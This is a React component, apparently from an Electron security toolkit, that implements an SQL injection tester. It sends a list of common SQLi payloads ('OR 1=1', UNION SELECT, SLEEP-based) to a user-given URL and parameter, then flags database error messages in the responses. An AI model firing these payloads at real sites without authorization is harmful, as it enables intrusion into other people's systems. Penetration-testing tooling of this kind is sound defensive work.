import { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import { DatabaseIcon } from '../common/Icons';
import styles from './SharedTool.module.css';

export default function SQLInjectionTester() {
  const [url, setUrl] = useState('');
  const [parameter, setParameter] = useState('');
  const [results, setResults] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [error, setError] = useState('');

  const payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR SLEEP(5)--",
  ];

  const test = async () => {
    if (!url.trim() || !parameter.trim()) {
      setError('Please enter URL and parameter name');
      return;
    }

    setLoading(true);
    setError('');
    setResults([]);
    setProgress(0);

    const vulnerabilities: string[] = [];

    for (let i = 0; i < payloads.length; i++) {
      const payload = payloads[i];
      const testUrl = `${url}?${parameter}=${encodeURIComponent(payload)}`;
      setProgress(Math.round(((i + 1) / payloads.length) * 100));

      try {
        const response = await window.electronAPI.net.httpFetch(testUrl, { method: 'GET' });
        if (response.success && response.data) {
          const errorPatterns = [
            /sql syntax/i,
            /mysql_fetch/i,
            /pg_query/i,
            /sqlite_query/i,
            /ora-[0-9]{5}/i,
            /syntax error/i,
            /unclosed quotation/i,
          ];

          const hasError = errorPatterns.some((p) => p.test(response.data || ''));
          if (hasError) {
            vulnerabilities.push(`Potential SQLi with: ${payload}`);
          }
        }
      } catch {}

      await new Promise((r) => setTimeout(r, 200));
    }

    setResults(
      vulnerabilities.length > 0
        ? vulnerabilities
        : ['No obvious SQL injection vulnerabilities detected']
    );
    setLoading(false);
  };

  return (
    <ToolWrapper
      title="SQL Injection Tester"
      icon={<DatabaseIcon />}
      description="Test for SQL injection vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            value={url}
            onChange={(e) => setUrl(e.target.value)}
            placeholder="https://example.com/page.php"
          />
        </div>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Parameter Name</label>
          <input
            type="text"
            className={styles.input}
            value={parameter}
            onChange={(e) => setParameter(e.target.value)}
            placeholder="id"
          />
        </div>
        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={test} disabled={loading}>
            {loading ? `Testing... ${progress}%` : 'Test SQL Injection'}
          </button>
          <button
            className={styles.secondaryBtn}
            onClick={() => {
              setUrl('');
              setParameter('');
              setResults([]);
              setError('');
            }}
          >
            Clear
          </button>
        </div>
      </div>

      {loading && (
        <div className={styles.resultBox}>
          <div className={styles.progressBar}>
            <div className={styles.progressFill} style={{ width: `${progress}%` }} />
          </div>
        </div>
      )}

      {error && <div className={styles.errorBox}>{error}</div>}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Results</span>
          </div>
          {results.map((r, i) => (
            <div key={i} className={styles.resultItem}>
              <span
                className={r.includes('Potential') ? styles.badgeWarning : styles.badgeSuccess}
                style={{ marginRight: '8px' }}
              >
                {r.includes('Potential') ? 'VULN' : 'OK'}
              </span>
              {r}
            </div>
          ))}
        </div>
      )}

      <div className={styles.warningBox}>
        Only test on systems you own or have permission to test.
      </div>
    </ToolWrapper>
  );
}
